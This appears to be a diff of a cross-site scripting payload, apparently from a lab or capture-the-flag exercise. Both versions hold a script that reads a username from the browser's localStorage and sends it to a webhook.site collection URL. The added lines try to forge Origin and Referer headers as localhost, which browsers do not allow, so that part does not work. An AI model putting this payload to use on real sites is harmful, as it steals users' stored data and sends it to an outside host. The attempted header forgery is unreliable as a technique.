@@ -1,4 +1,10 @@
-<script>fetch(`https://webhook.site/57fc2c63-8eac-4f9a-9170-c9167826724a?c=${window.localStorage['username']}`)
+<script>
+var myHeaders = new Headers(); // Currently empty
+myHeaders.append('Origin', 'http://localhost:4000');
+myHeaders.set('Origin', 'http://localhost:4000');
+myHeaders.append('Referer', 'http://localhost:4000');
+myHeaders.set('Referer', 'http://localhost:4000');
+fetch(`https://webhook.site/57fc2c63-8eac-4f9a-9170-c9167826724a?c=${window.localStorage['username']}`)
     .then(function(response) {
       return response.json();
     })
